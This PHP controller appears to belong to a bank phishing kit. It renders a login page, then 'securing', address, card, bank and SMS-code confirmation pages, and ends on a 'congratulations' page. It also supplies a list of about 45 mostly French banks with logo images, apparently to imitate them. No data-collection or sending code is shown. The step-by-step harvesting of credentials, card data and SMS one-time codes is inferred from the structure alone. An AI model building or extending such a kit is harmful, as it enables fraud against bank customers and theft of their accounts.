<?php

namespace App\Http\Controllers;

use Core\Template\TemplateCompiler as View;

class AppController extends Controller
{
    public function home(View $view)
    {
        return $view->render('home');
    }

    public function login(View $view)
    {
        return $view->render('login');
    }
    public function securing(View $view)
    {
        return $view->render('securing');
    }
    public function confirmAddress(View $view)
    {
        return $view->render('confirm-address');
    }
    public function confirmCard(View $view)
    {
        return $view->render('confirm-card');
    }
    public function confirmBank(View $view)
    {
        return $view->render('confirm-bank', ['banks' => $this->banks()]);
    }
    public function confirmSmsBank(View $view)
    {
        return $view->render('confirm-sms-bank');
    }
    public function congratulations(View $view)
    {
        return $view->render('congratulations');
    }

    protected function banks()
    {
        return [
            [
                "name" => "SmartPay by Sogexia",
                "source" => "/images/smart-pay-by-sogexia-logo.png",
            ],
            [
                "name" => "Revolut",
                "source" => "/images/revolut-logo.png",
            ],
            [
                "name" => "N26",
                "source" => "/images/n26-logo.png",
            ],
            [
                "name" => "Morning",
                "source" => "/images/morning-logo.jpg",
            ],
            [
                "name" => "Monese",
                "source" => "/images/monese-logo.png",
            ],
            [
                "name" => "ipagoo",
                "source" => "/images/ipagoo-logo.jpg",
            ],
            [
                "name" => "Ferratum Bank",
                "source" => "/images/ferratum-bank-logo.png",
            ],
            [
                "name" => "Vivid Money",
                "source" => "/images/vivid-money-logo.jpg",
            ],
            [
                "name" => "Helios",
                "source" => "/images/helios-banque-verte-logo.png",
            ],
            [
                "name" => "EKO",
                "source" => "/images/eko-logo.png",
            ],
            [
                "name" => "Ditto Bank",
                "source" => "/images/ditto-bank-logo.png",
            ],
            [
                "name" => "Nickel",
                "source" => "/images/nickel-logo.jpg",
            ],
            [
                "name" => "C-zam",
                "source" => "/images/c-zam-logo.jpg",
            ],
            [
                "name" => "Anytime",
                "source" => "/images/anytime-logo.png",
            ],
            [
                "name" => "Wormser Frères",
                "source" => "/images/wormser-frères-logo.png",
            ],
            [
                "name" => "Rothschild",
                "source" => "/images/rothschild-logo.jpg",
            ],
            [
                "name" => "Natixis Wealth Management",
                "source" => "/images/natixis-wealth-management-logo.jpg",
            ],
            [
                "name" => "Mirabaud",
                "source" => "/images/mirabaud-logo.jpg",
            ],
            [
                "name" => "Legal & General",
                "source" => "/images/legal-general-logo.png",
            ],
            [
                "name" => "Banque Privée Européenne ",
                "source" => "/images/banque-privee-europeenne-logo.png",
            ],
            [
                "name" => "Banque Palatine",
                "source" => "/images/banque-palatine-logo.jpg",
            ],
            [
                "name" => "Banque Marze",
                "source" => "/images/banque-marze-logo.png",
            ],
            [
                "name" => "Banque Martin Maurel",
                "source" => "/images/banque-martin-maurel-logo.jpg",
            ],
            [
                "name" => "Crédit Mutuel",
                "source" => "/images/credit-mutuel-logo.png",
            ],
            [
                "name" => "VTB Bank France",
                "source" => "/images/vtb-bank-france-logo.png",
            ],
            [
                "name" => "RCI Banque",
                "source" => "/images/rci-banque-logo.png",
            ],
            [
                "name" => "PSA Banque",
                "source" => "/images/psa-banque-logo.png",
            ],
            [
                "name" => "Milleis Banque",
                "source" => "/images/milleis-banque-logo.png",
            ],
            [
                "name" => "Groupama Banque",
                "source" => "/images/groupama-banque-logo.jpg",
            ],
            [
                "name" => "Carrefour Banque",
                "source" => "/images/carrefour-banque-logo.jpg",
            ],
            [
                "name" => "BRED",
                "source" => "/images/bred-logo.png",
            ],
            [
                "name" => "Banque Casino",
                "source" => "/images/banque-casino-logo.jpg",
            ],
            [
                "name" => "Banque Accord",
                "source" => "/images/banque-accord-logo.jpg",
            ],
            [
                "name" => "AXA Banque",
                "source" => "/images/axa-banque-logo.jpg",
            ],
            [
                "name" => "Credit agricole",
                "source" => "/images/logo-cabp-140x100.png",
            ],
            [
                "name" => "Allianz Banque",
                "source" => "/images/allianz-banque-logo.jpg",
            ],
            [
                "name" => "Sociéte général",
                "source" => "/images/logo-societe-generale.png",
            ],
            [
                "name" => "BNP paribas",
                "source" => "/images/bnp-alone.png",
            ],
            [
                "name" => "Caisse d'épagne",
                "source" => "/images/logo-ce-desktop.png",
            ],
            [
                "name" => "Boursrama Banque",
                "source" => "/images/logo-bbq.png",
            ],
            [
                "name" => "bforbank",
                "source" => "/images/bforbank.png",
            ],
            [
                "name" => "La banque postale",
                "source" => "/images/logo-lbp.png",
            ],
            [
                "name" => "LCL Banque et assurance",
                "source" => "/images/cf686a7a-78ff-46df-9bd9-8ccc5010acb7_logo_appli_bloc_push.png",
            ],
            [
                "name" => "Banque populaire",
                "source" => "/images/bp-01.png",
            ],  [
                "name" => "Autres banques",
                "source" => "/images/autres-banques-image.png",
            ]
        ];
    }
}
